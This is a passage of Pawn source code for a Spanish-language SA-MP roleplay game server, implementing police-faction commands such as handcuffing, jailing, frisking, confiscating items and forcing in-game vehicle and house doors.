	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
 	{
		SendClientMessage(playerid, Naranja, "* /Esposar [ID]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
    if(playerid == playerid2){SendClientMessage(playerid,Rojo,"* No te puedes esposar a tí mismo."); return 1;}
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    if(!GetPlayersProx(3.0, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
	if(IsPlayerInAnyVehicle(playerid2)){SendClientMessage(playerid, Rojo, "* No puedes esposar a alguien que está en un vehículo. Prueba /Retener."); return 1;}
	if(IsPlayerInAnyVehicle(playerid) && GetPlayerVehicleID(playerid2) == 0){SendClientMessage(playerid, Rojo, "* No puedes esposar a alguien desde un vehículo."); return 1;}
    if(PlayerInfo[playerid2][pServicioPD] > 0){SendClientMessage(playerid,Rojo,"* No puedes esposar a un policía de servicio."); return 1;}
    format(string, sizeof(string), "* Has sido esposado por %s. No trates de correr o saltar.", GetPlayerNameRP(playerid));
    SendClientMessage(playerid2, AzulClaro, string);
    format(string, sizeof(string), "* Has esposado a %s. Escribe '/Desesposar' para desesposarlo.", GetPlayerNameRP(playerid2));
    SendClientMessage(playerid, AzulClaro, string);
    format(string, sizeof(string), "* %s coloca unas esposas a %s.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
    ClearAnimations(playerid2, 1);
    SetPlayerSpecialAction(playerid2, SPECIAL_ACTION_CUFFED);
    SetPlayerAttachedObject(playerid2, 4, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977,-81.700035, 0.891999, 1.000000, 1.168000);
    Esposado[playerid2] = 1;
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/desesposar", true) == 0) //Desesposar a un jugador
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
 	{
		SendClientMessage(playerid, Naranja, "* /Desesposar [ID]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    if(!GetPlayersProx(3.0, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
	if(IsPlayerInAnyVehicle(playerid2)){SendClientMessage(playerid, Rojo, "* No puedes desesposar a alguien que está en un vehículo. Prueba /Soltar."); return 1;}
	if(Esposado[playerid2] != 1){SendClientMessage(playerid, Rojo, "* Esta persona no está esposada."); return 1;}
    format(string, sizeof(string), "* Has sido desesposado por %s.", GetPlayerNameRP(playerid));
    SendClientMessage(playerid2, AzulClaro, string);
    format(string, sizeof(string), "* Has desesposado a %s.", GetPlayerNameRP(playerid2));
    SendClientMessage(playerid, AzulClaro, string);
    format(string, sizeof(string), "* %s quita las esposas a %s.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
    ClearAnimations(playerid2, 1);
    SetPlayerSpecialAction(playerid2, SPECIAL_ACTION_NONE);
    RemovePlayerAttachedObject(playerid2, 4);
    Esposado[playerid2] = 0;
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/retener", true) == 0) //Retener a un jugador a un vehículo
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
 	{
		SendClientMessage(playerid, Naranja, "* /Retener [ID]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
	if(!IsPlayerInAnyVehicle(playerid)){SendClientMessage(playerid,Rojo,"* No estás en ningún vehículo."); return 1;}
    if(playerid == playerid2){SendClientMessage(playerid,Rojo,"* No te puedes retener a tí mismo."); return 1;}
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
	if(GetPlayerVehicleID(playerid2) != GetPlayerVehicleID(playerid)){SendClientMessage(playerid, Rojo, "* Esta persona no está dentro de tu vehículo."); return 1;}
    if(PlayerInfo[playerid2][pServicioPD] > 0){SendClientMessage(playerid,Rojo,"* No puedes retener a un policía de servicio."); return 1;}
    format(string, sizeof(string), "* Has sido esposado al vehículo por %s.", GetPlayerNameRP(playerid));
    SendClientMessage(playerid2, AzulClaro, string);
    format(string, sizeof(string), "* Has esposado a %s al vehículo. Escribe '/Soltar' para desesposarlo.", GetPlayerNameRP(playerid2));
    SendClientMessage(playerid, AzulClaro, string);
    format(string, sizeof(string), "* %s retiene a %s en el vehículo.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
    TogglePlayerControllable(playerid2, 0);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/soltar", true) == 0) //Soltar a un jugador del vehículo
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
 	{
		SendClientMessage(playerid, Naranja, "* /Soltar [ID]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
	if(!IsPlayerInAnyVehicle(playerid)){SendClientMessage(playerid,Rojo,"* No estás en ningún vehículo."); return 1;}
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
	if(GetPlayerVehicleID(playerid2) != GetPlayerVehicleID(playerid)){SendClientMessage(playerid, Rojo, "* Esta persona no está en tu vehículo."); return 1;}
    format(string, sizeof(string), "* Has sido desesposado del vehículo.", GetPlayerNameRP(playerid));
    SendClientMessage(playerid2, AzulClaro, string);
    format(string, sizeof(string), "* Has desesposado del vehículo a %s.", GetPlayerNameRP(playerid2));
    SendClientMessage(playerid, AzulClaro, string);
    format(string, sizeof(string), "* %s desesposa a %s del vehículo.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
    TogglePlayerControllable(playerid2, 1);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/refuerzos", true) == 0 || strcmp(cmd,"/ref",true) ==0 ) //Solicitar refuerzos
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
	if(SolicitaRefuerzos[playerid] == 1){SendClientMessage(playerid,Rojo,"* Ya estás solicitando refuerzos."); return 1;}
	SolicitaRefuerzos[playerid] = 1;
	format(string, sizeof(string), "[Radio] Central: A todas las unidades, el agente {FF0000}%s {02b1af}solicita refuerzos en su posición.", GetPlayerNameRP(playerid));
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerInfo[i][pFaccion] == 1 && PlayerInfo[i][pServicioPD] > 0)
			{
				SetPlayerMarkerForPlayer(i, playerid, 0x1229FAFF);
				SendClientMessage(i, AguamarinaOscuro, string);
			}
		}
	}
	SendClientMessage(playerid, Naranja, "* Escribe '/NoRef' para cancelar la petición de refuerzos.");
	NoRefAuto[playerid] = SetTimerEx("NoRefAutoF", 600000, false, "i", playerid);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/noref", true) == 0) //Dejar de solicitar refuerzos
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(SolicitaRefuerzos[playerid] == 0){SendClientMessage(playerid,Rojo,"* No estás solicitando refuerzos."); return 1;}
	SolicitaRefuerzos[playerid] = 0;
	format(string, sizeof(string), "[Radio] Central: El agente {FF0000}%s {02b1af}ya no solicita refuerzos.", GetPlayerNameRP(playerid));
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerInfo[i][pFaccion] == 1 && PlayerInfo[i][pServicioPD] > 0)
			{
				SetPlayerMarkerForPlayer(i, playerid, Blanco2);
				SendClientMessage(i, AguamarinaOscuro, string);
			}
		}
	}
	KillTimer(NoRefAuto[playerid]);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/mascara", true) == 0) //Ponerse o quitarse una mascara antigas
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] != 9){SendClientMessage(playerid,Rojo,"* No estás de servicio como SWAT."); return 1;}
	if(MascaraGas[playerid] == 0)
	{
		MascaraGas[playerid] = 1;
		SetPlayerAttachedObject(playerid, 8, 19472, 2, 0.001, 0.147, 0.004, -77.8998, -131.2999, 15.7999, 0.9549, 0.697, 0.7739);
		format(string, sizeof(string), "* %s se coloca una máscara antigas.", GetPlayerNameRP(playerid));
	 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	 	ApplyAnimation(playerid, "goggles", "goggles_put_on",4.1,0,1,1,0,0);
 	}
	else if(MascaraGas[playerid] == 1)
	{
		MascaraGas[playerid] = 0;
		RemovePlayerAttachedObject(playerid, 8);
		format(string, sizeof(string), "* %s se quita su máscara antigas.", GetPlayerNameRP(playerid));
	 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	 	ApplyAnimation(playerid, "goggles", "goggles_put_on",4.1,0,1,1,0,0);
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/forzarvehiculo", true) == 0) //Forzar la apertura de un vehículo
{
    if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio como policía."); return 1;}
	if(PlayerInfo[playerid][pRango] < 3){SendClientMessage(playerid,Rojo,"* Rango insuficiente."); return 1;}
	new car, Float:distancia = 4.0, Float:vX, Float:vY, Float:vZ;
	for(new x=0; x <= TotalVeh; x++)
	{
	    GetVehiclePos(x, vX, vY, vZ);
	    if(IsPlayerInRangeOfPoint(playerid, 3.5, vX, vY, vZ) && !IsABike(x) && CarInfo[x][cCerrado] == 1)
	    {
	        if(GetPlayerDistanceFromPoint(playerid, vX, vY, vZ) <= distancia)distancia = GetPlayerDistanceFromPoint(playerid, vX, vY, vZ), car = x;
	    }
	}
	if(car == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún vehículo a tu alrededor que puedas abrir."); return 1;}
	new engine,lights,alarm,doors,bonnet,boot,objective;
    GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
    SetVehicleParamsEx(car,engine,lights,alarm,0,bonnet,boot,objective);
    CarInfo[car][cCerrado] = 0;
    format(string, sizeof(string), "* %s fuerza la puerta de un vehículo con unas tenazas.", GetPlayerNameRP(playerid));
    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/forzarmaletero", true) == 0) //Forzar la apertura de un maletero
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio como policía."); return 1;}
	if(PlayerInfo[playerid][pRango] < 3){SendClientMessage(playerid,Rojo,"* Rango insuficiente."); return 1;}
	new car, Float:distancia = 4.0, Float:vX, Float:vY, Float:vZ;
	for(new x=0; x <= TotalVeh; x++)
	{
	    GetVehiclePos(x, vX, vY, vZ);
	    if(IsPlayerInRangeOfPoint(playerid, 3.5, vX, vY, vZ) && !IsABike(x) && VehMaletero[x] == 0)
	    {
	        if(GetPlayerDistanceFromPoint(playerid, vX, vY, vZ) <= distancia)distancia = GetPlayerDistanceFromPoint(playerid, vX, vY, vZ), car = x;
	    }
	}
	if(car == 0){SendClientMessage(playerid, Rojo, "* No se ha detectado ningún vehículo a tu alrededor que puedas abrir."); return 1;}
	new engine,lights,alarm,doors,bonnet,boot,objective;
    GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
    SetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,1,objective);
    format(string, sizeof(string), "* %s fuerza el maletero de un vehículo con unas tenazas.", GetPlayerNameRP(playerid));
    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
    VehMaletero[car] = 1;
    MostrarMaletero(playerid, car);
    VehMaleteroPlayer[playerid] = car;
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/laser", true) == 0) //Ponero o quitar laser en armas LSPD
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio como policía."); return 1;}
	if(LaserON[playerid] == 0)
	{
		LaserON[playerid] = 1;
		SetPlayerAttachedObject(playerid, 0, 19472, 2, 0.001, 0.147, 0.004, -77.8998, -131.2999, 15.7999, 0.9549, 0.697, 0.7739);
		SendClientMessage(playerid, Amarillo, "* Laser en armas activado.");
 	}
	else if(LaserON[playerid] == 1)
	{
		LaserON[playerid] = 0;
		RemovePlayerAttachedObject(playerid, 0);
		SendClientMessage(playerid, Amarillo, "* Laser en armas desactivado.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/encarcelar", true) == 0) //Encarcelar a un delincuente (meter en jail)
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
 	{
		SendClientMessage(playerid, Naranja, "* /Encarcelar [ID] [Tiempo (min)]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    if(playerid == playerid2){SendClientMessage(playerid,Rojo,"* No te puedes encarcelar a tí mismo."); return 1;}
    if(!IsPlayerInRangeOfPoint(playerid, 15.0, 266.25, 82.95, 1001.29) && !IsPlayerInRangeOfPoint(playerid, 15.0, 2529.6387,-1281.9346,1048.2891)){SendClientMessage(playerid,Rojo,"* No estás en las celdas de comisaría o la prisión federal."); return 1;}
	if(PlayerInfo[playerid2][pFaccion] == 1){SendClientMessage(playerid,Rojo,"* No puedes arrestar a un policía."); return 1;}
	if(!GetPlayersProx(5.0, playerid, playerid2)){SendClientMessage(playerid, Rojo,"* Debe estar más cerca de tí."); return 1;}
	if(PlayerInfo[playerid2][pEncarcelado] > 0){SendClientMessage(playerid, Rojo,"* Esta persona ya está encarcelada. Para sacarla de prisión utiliza /DesEncarcelar."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
 	{
		SendClientMessage(playerid, Naranja, "* /Encarcelar [ID] [Tiempo (min)]");
		return 1;
	}
	new tiempo = strval(tmp);
	if(tiempo < 5){SendClientMessage(playerid,Rojo,"* El tiempo no puede ser menor que 5 minuto."); return 1;}
	else if(tiempo > 20 && IsPlayerInRangeOfPoint(playerid, 15.0, 266.25, 82.95, 1001.29)){SendClientMessage(playerid,Rojo,"* Para tiempos mayores a 20 minutos encarcelar en la prisión."); return 1;}
	else if(tiempo <= 20 && IsPlayerInRangeOfPoint(playerid, 15.0, 2529.6387,-1281.9346,1048.2891)){SendClientMessage(playerid,Rojo,"* Para tiempos menores a 20 minutos encarcelar en la comisaría."); return 1;}
	
	new string2[170];
	if(IsPlayerInRangeOfPoint(playerid, 15.0, 266.25, 82.95, 1001.29))
	{
		if(IsPlayerInRangeOfPoint(playerid, 2.0, 266.25, 78.46, 1001.29)){SetPlayerPos(playerid2, 264.1901,77.6065,1001.0391);}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 266.25, 82.95, 1001.29)){SetPlayerPos(playerid2, 264.1901,82.1493,1001.0391);}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 266.25, 87.46, 1001.29)){SetPlayerPos(playerid2, 264.1901,86.6467,1001.0391);}
		else{SendClientMessage(playerid, Rojo, "* Debes estar frente a una de las celdas."); return 1;}
		PlayerInfo[playerid2][pEncarcelado] = 1, PlayerInfo[playerid2][pTiempoCarcel] = tiempo;
		
		format(string2, sizeof(string2), "* Has sido encarcelado en comisaría %d minutos por %s.", tiempo, GetPlayerNameRP(playerid));
	    SendClientMessage(playerid2, Amarillo, string2);
	    format(string2, sizeof(string2), "* Has encarcelado a %s durante %d minutos.", GetPlayerNameRP(playerid2), tiempo);
	    SendClientMessage(playerid, Amarillo, string2);
	    format(string2, sizeof(string2), "[Radio] Central: El agente {FF0000}%s {02b1af}ha encarcelado al delincuente {FF0000}%s {02b1af}en comisaría.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
	    SendRadioMessage(1, AguamarinaOscuro, string2);
	    printf("El policía %s ha encarcelado a %s %d minutos en comisaría.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), tiempo);
	}
	else if(IsPlayerInRangeOfPoint(playerid, 15.0, 2529.6387,-1281.9346,1048.2891))
	{
	    SetPlayerPos(playerid2, 2532.8345,-1291.8160,1044.1250);
	    PlayerInfo[playerid2][pEncarcelado] = 2, PlayerInfo[playerid2][pTiempoCarcel] = tiempo;
	    format(string2, sizeof(string2), "* Has sido encarcelado en la prisión federal %d minutos por %s.", tiempo, GetPlayerNameRP(playerid));
	    SendClientMessage(playerid2, Amarillo, string2);
	    format(string2, sizeof(string2), "* Has encarcelado a %s durante %d minutos.", GetPlayerNameRP(playerid2), tiempo);
	    SendClientMessage(playerid, Amarillo, string2);
	    format(string2, sizeof(string2), "[Radio] Central: El agente {FF0000}%s {02b1af}ha encarcelado al delincuente {FF0000}%s {02b1af}en la prisión federal.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
	    SendRadioMessage(1, AguamarinaOscuro, string2);
	    printf("El policía %s ha encarcelado a %s %d minutos en la prisión federal.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2), tiempo);
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/desencarcelar", true) == 0) //Desencarcelar a un delincuente (sacar de jail)
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
 	{
		SendClientMessage(playerid, Naranja, "* /Desencarcelar [ID]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    if(playerid == playerid2){SendClientMessage(playerid,Rojo,"* No te puedes desencarcelar a tí mismo."); return 1;}
    if(!IsPlayerInRangeOfPoint(playerid, 15.0, 266.25, 82.95, 1001.29) && !IsPlayerInRangeOfPoint(playerid, 15.0, 2529.6387,-1281.9346,1048.2891)){SendClientMessage(playerid,Rojo,"* No estás en las celdas de comisaría ni en la prisión federal."); return 1;}
	if(!GetPlayersProx(3.0, playerid, playerid2)){SendClientMessage(playerid, Rojo,"* Debes estar más cerca de él."); return 1;}
	if(PlayerInfo[playerid2][pEncarcelado] == 0){SendClientMessage(playerid, Rojo,"* Esta persona no está encarcelada."); return 1;}
	if(PlayerInfo[playerid2][pEncarcelado] == 1)SetPlayerPos(playerid2, 268.25, 82.95, 1001.29);
	if(PlayerInfo[playerid2][pEncarcelado] == 2)SetPlayerPos(playerid2, 2529.6387,-1281.9346,1048.2891);
	PlayerInfo[playerid2][pEncarcelado] = 0, PlayerInfo[playerid2][pTiempoCarcel] = 0;
    format(string, sizeof(string), "* Has sido desencarcelado por %s.", GetPlayerNameRP(playerid));
    SendClientMessage(playerid2, Amarillo, string);
    format(string, sizeof(string), "* Has desencarcelado a %s.", GetPlayerNameRP(playerid2));
    SendClientMessage(playerid, Amarillo, string);
    format(string, sizeof(string), "[Radio] Central: El agente {FF0000}%s {02b1af}ha liberado al preso {FF0000}%s.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
    SendRadioMessage(1, AguamarinaOscuro, string);
    printf("El policía %s ha desencarcelado a %s.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/cachear", true) == 0) //Cachear a alguien
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
 	{
		SendClientMessage(playerid, Naranja, "* /Cachear [ID]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    if(playerid == playerid2){SendClientMessage(playerid,Rojo,"* No te puedes cachear a tí mismo."); return 1;}
	if(!GetPlayersProx(1.5, playerid, playerid2)){SendClientMessage(playerid, Rojo,"* Debes estar a su lado para cachearle."); return 1;}
	if(PlayerInfo[playerid2][pServicioPD] > 0){SendClientMessage(playerid,Rojo,"* No puedes cachear a un policía de servicio."); return 1;}
	if(IsPlayerInAnyVehicle(playerid) && GetPlayerVehicleID(playerid2) != GetPlayerVehicleID(playerid)){SendClientMessage(playerid, Rojo, "* No puedes cachear a alguien desde un vehículo."); return 1;}
    format(string, sizeof(string), "* Has sido cacheado por %s.", GetPlayerNameRP(playerid));
    SendClientMessage(playerid2, AzulClaro, string);
    format(string, sizeof(string), "* Has cacheado a %s.", GetPlayerNameRP(playerid2));
    SendClientMessage(playerid, AzulClaro, string);
	for(new x=0; x < 8; x++)
	{
	    format(string, sizeof(string), "Bolsillo %d: %s (%d).", x+1, ObjetoInfo[PlayerInfo[playerid2][pBol][x]][NombreObjeto], PlayerInfo[playerid2][pBolCant][x]);
	    SendClientMessage(playerid, AmarilloClaro, string);
	}
	format(string, sizeof(string), "* %s cachea a %s en busca de objetos ilegales.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/requisar", true) == 0) //Requisar objetos a alguien
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
 	{
		SendClientMessage(playerid, Naranja, "* /Requisar [ID] [Armas/Municion/Drogas]");
		return 1;
	}
	playerid2 = ReturnUser(tmp);
    if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
    if(playerid == playerid2){SendClientMessage(playerid,Rojo,"* No te puedes requisar objetos a tí mismo."); return 1;}
	if(!GetPlayersProx(1.5, playerid, playerid2)){SendClientMessage(playerid, Rojo,"* Debes estar a su lado."); return 1;}
	if(PlayerInfo[playerid2][pServicioPD] > 0){SendClientMessage(playerid,Rojo,"* No puedes requisar objetos a un policía."); return 1;}
	if(IsPlayerInAnyVehicle(playerid)){SendClientMessage(playerid, Rojo, "* No puedes requisar objetos a alguien desde un vehículo."); return 1;}
	if(IsPlayerInAnyVehicle(playerid2)){SendClientMessage(playerid, Rojo, "* No puedes requisar objetos a alguien que está en un vehículo."); return 1;}
    new objetos[20];
	objetos = strtok(cmdtext, idx);
	if(!strlen(objetos))
	{
		SendClientMessage(playerid, Naranja, "* /Requisar [ID] [Armas/Municion/Drogas]");
		return 1;
	}
	if(strcmp(objetos,"armas",true) == 0)
	{
	    format(string, sizeof(string), "* %s te ha requisado todas sus armas.", GetPlayerNameRP(playerid));
	    SendClientMessage(playerid2, AzulClaro, string);
	    format(string, sizeof(string), "* Has requisado a %s todas sus armas.", GetPlayerNameRP(playerid2));
	    SendClientMessage(playerid, AzulClaro, string);
	    new TieneObjeto;
		for(new x=0; x < 8; x++)
		{
		    if(ObjetoInfo[PlayerInfo[playerid2][pBol][x]][IDArma] > 0)
		    {
			    format(string, sizeof(string), "* Un/a %s (%d) requisado.", ObjetoInfo[PlayerInfo[playerid2][pBol][x]][NombreObjeto], PlayerInfo[playerid2][pBolCant][x]);
			    SendClientMessage(playerid, AmarilloClaro, string);
			    PlayerInfo[playerid2][pBol][x] = 0, PlayerInfo[playerid2][pBolCant][x] = 0;
			    TieneObjeto = 1;
		    }
		}
		if(TieneObjeto == 0)SendClientMessage(playerid, AmarilloClaro, "* Nada.");
		format(string, sizeof(string), "* %s requisa a %s sus armas.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
	 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	 	printf(string);
		return 1;
	}
	if(strcmp(objetos,"municion",true) == 0)
	{
	    format(string, sizeof(string), "* %s te ha requisado tus municiones.", GetPlayerNameRP(playerid));
	    SendClientMessage(playerid2, AzulClaro, string);
	    format(string, sizeof(string), "* Has requisado a %s sus municiones.", GetPlayerNameRP(playerid2));
	    SendClientMessage(playerid, AzulClaro, string);
	    new TieneObjeto;
		for(new x=0; x < 8; x++)
		{
		    if(PlayerInfo[playerid2][pBol][x] <= 53 && PlayerInfo[playerid2][pBol][x] >= 39)
		    {
			    format(string, sizeof(string), "* Un/a %s (%d) requisado.", ObjetoInfo[PlayerInfo[playerid2][pBol][x]][NombreObjeto], PlayerInfo[playerid2][pBolCant][x]);
			    SendClientMessage(playerid, AmarilloClaro, string);
			    PlayerInfo[playerid2][pBol][x] = 0, PlayerInfo[playerid2][pBolCant][x] = 0;
				TieneObjeto = 1;
		    }
		}
		if(TieneObjeto == 0)SendClientMessage(playerid, AmarilloClaro, "* Nada.");
		format(string, sizeof(string), "* %s requisa a %s sus municiones.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
	 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	 	printf(string);
		return 1;
	}
	else if(strcmp(objetos,"drogas",true) == 0)
	{
	    format(string, sizeof(string), "* %s te ha requisado tus drogas.", GetPlayerNameRP(playerid));
	    SendClientMessage(playerid2, AzulClaro, string);
	    format(string, sizeof(string), "* Has requisado a %s sus drogas.", GetPlayerNameRP(playerid2));
	    SendClientMessage(playerid, AzulClaro, string);
	    new TieneObjeto;
		for(new x=0; x < 8; x++)
		{
		    if(PlayerInfo[playerid2][pBol][x] <= 86 && PlayerInfo[playerid2][pBol][x] >= 75)
		    {
			    format(string, sizeof(string), "* Un/a %s (%d) requisado.", ObjetoInfo[PlayerInfo[playerid2][pBol][x]][NombreObjeto], PlayerInfo[playerid2][pBolCant][x]);
			    SendClientMessage(playerid, AmarilloClaro, string);
			    PlayerInfo[playerid2][pBol][x] = 0, PlayerInfo[playerid2][pBolCant][x] = 0;
				TieneObjeto = 1;
		    }
		}
		if(TieneObjeto == 0)SendClientMessage(playerid, AmarilloClaro, "* Nada.");
		format(string, sizeof(string), "* %s requisa a %s sus drogas.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
	 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	 	printf(string);
	}
	else
	{
		SendClientMessage(playerid, Rojo, "* Opción inválida.");
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/irrumpir", true) == 0) //Abrir una puerta por la fuerza
{
    if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid,Rojo,"* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid,Rojo,"* No estás de servicio."); return 1;}
	if(PlayerInfo[playerid][pRango] < 2){SendClientMessage(playerid,Rojo,"* Rango insuficiente."); return 1;}
	if(!GetPlayerFueraPuertaCasa(playerid)){SendClientMessage(playerid,Rojo,"* No estás en la puerta de una casa o de un local."); return 1;}
	if(GetPlayerFueraPuertaCasa(playerid)) //Está en la puerta de una casa
	{
		new casa = GetPlayerFueraPuertaCasa(playerid);
